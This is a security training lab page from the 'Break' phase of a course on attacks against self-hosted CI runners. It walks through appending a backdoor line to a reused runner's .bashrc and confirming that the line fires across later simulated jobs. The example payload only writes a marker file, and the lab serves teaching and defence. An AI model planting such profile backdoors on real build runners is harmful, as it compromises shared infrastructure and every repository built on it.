# Lab 2.5: Self-Hosted Runner Attacks

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Break</span>
  <span class="phase-arrow">›</span>
  <a href="../defend/" class="phase-step upcoming">Defend</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

## Backdoor Persistence

### Step 1: Inspect the persistent runner profile

```bash
ls -la /runner/workspace/
cat /runner/workspace/.bashrc
```

In this lab, the simulated runner sources `/runner/workspace/.bashrc` before every job. That gives you a concrete way to model the persistence boundary without pretending Gitea is executing the attack for you.

### Step 2: Plant the backdoor a PR job would leave behind

```bash
echo 'echo "BACKDOOR: $(date)" >> /tmp/runner-compromised' >> /runner/workspace/.bashrc
tail -n 5 /runner/workspace/.bashrc
```

The important part is not the exact payload. It is that an untrusted build can modify machine state that later builds inherit automatically.

### Step 3: Simulate the next build on the same runner

```bash
bash /runner/run-job.sh bash -lc 'echo "Normal build on reused runner"'
```

### Step 4: Confirm the persistence fired

```bash
cat /tmp/runner-compromised
```

Run another simulated job and notice the state carries forward again:

```bash
bash /runner/run-job.sh bash -lc 'echo "Another build on the same host"'
cat /tmp/runner-compromised
```

**Checkpoint:** You should now have a compromise marker that keeps reappearing across jobs because the runner reused attacker-modified state.

- **The PR does not need to be merged.** The first untrusted job already changed the runner.
- **The backdoor survives.** It persists in runner state instead of repository history.
- **Cross-repo impact is possible.** A shared runner extends the blast radius beyond one repository.
